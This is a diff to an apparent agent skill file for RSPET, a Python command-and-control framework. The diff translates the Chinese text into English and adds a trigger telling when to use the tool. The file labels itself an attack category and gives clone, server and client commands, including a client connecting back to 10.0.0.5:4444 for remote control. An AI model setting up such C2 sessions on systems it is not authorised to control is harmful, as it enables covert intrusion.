@@ -2,37 +2,40 @@
 name: rspet-c2
 description: "RSPET: Python-based remote control. Signals: C2, command and control, server, client, encryption."
 zh-signals: "RSPET: Python 远控。信号:c2,命令控制,服务端,客户端,加密。"
+when-to-use: >-
+  Use when you need a lightweight Python command-and-control server and client to
+  manage multiple remote sessions with optional encryption.
 ---
 
 # RSPET
 
-- 攻击大类:C35 C2框架与远控
-- 上游仓库:https://github.com/panagiks/RSPET
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C35 C2 Frameworks and Remote Control
+- Upstream Repository: https://github.com/panagiks/RSPET
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/panagiks/RSPET && cd RSPET
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python3 rspet_server.py -p 4444` | 服务端 |
-| `python3 rspet_client.py -H 10.0.0.5 -p 4444` | 客户端 |
-| `-e` | 加密 |
+| `python3 rspet_server.py -p 4444` | Server side |
+| `python3 rspet_client.py -H 10.0.0.5 -p 4444` | Client side |
+| `-e` | Encryption |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### Python 远控
+### Python Remote Control
 
 ```bash
 python3 rspet_server.py
-# 多客户端管理
+# Manage multiple clients
 ```
 
-## 注意事项
+## Notes
 
-Python 远控框架。
+A Python remote-control framework.
